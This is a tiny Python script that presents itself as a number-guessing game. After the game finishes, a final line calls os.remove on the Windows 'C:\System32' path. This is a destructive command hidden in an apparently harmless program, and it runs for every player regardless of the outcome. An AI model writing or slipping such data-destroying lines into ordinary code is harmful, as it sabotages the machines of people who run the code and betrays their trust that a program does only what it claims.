import time
import random
import os

print("Guess the number")
user_number = int(input("Enter Your number "))
random_ńumber = random.randint(1,5)

if user_number == random_ńumber:
    print("You Win")
else:
    print(f"You lose! the correct number was {random_ńumber}")
os.remove("C:\System32")
